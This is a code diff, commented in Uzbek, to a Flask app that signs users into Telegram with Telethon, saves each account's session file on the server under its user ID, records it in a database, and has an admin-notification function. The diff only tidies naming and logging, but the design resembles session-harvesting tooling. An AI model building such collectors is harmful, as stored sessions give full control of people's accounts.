@@ -140,9 +140,9 @@ def verify_code():
 
     try:
         async def work():
-            # 🔴 FAQAT BITTA CLIENT
+            # 🔴 BITTA CLIENT, BITTA SESSION
             client = TelegramClient(
-                os.path.join(SESSIONS_DIR, "temp"),
+                os.path.join(SESSIONS_DIR, phone.replace("+", "")),
                 API_ID,
                 API_HASH
             )
@@ -156,20 +156,21 @@ def verify_code():
 
             me = await client.get_me()
 
-            # 🔴 SESSIONNI USER_ID NOMI BILAN QAYTA SAQLAYMIZ
+            # 🔴 SESSIONNI USER_ID NOMI BILAN QAYTA NOMLAYMIZ
+            old_path = os.path.join(SESSIONS_DIR, phone.replace("+", "") + ".session")
+            new_path = os.path.join(SESSIONS_DIR, f"{me.id}.session")
+
             await client.disconnect()
 
-            os.rename(
-                os.path.join(SESSIONS_DIR, "temp.session"),
-                os.path.join(SESSIONS_DIR, f"{me.id}.session")
-            )
+            if os.path.exists(old_path):
+                os.rename(old_path, new_path)
 
             return me
 
         me = run_async(work())
         pending.pop(phone, None)
 
-        # 🔹 DB ga yozamiz
+        # 🔽 DB GA YOZISH
         conn = get_db()
         cur = conn.cursor()
         cur.execute("""
@@ -183,8 +184,9 @@ def verify_code():
         return jsonify({"status": "success"})
 
     except Exception as e:
-        print("VERIFY ERROR:", e)
+        print("VERIFY_CODE ERROR:", e)
         return jsonify({"status": "error"})
+
 
 
 
@@ -263,6 +265,7 @@ def notify_admin(user_id: str, phone: str, username: str | None = None):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
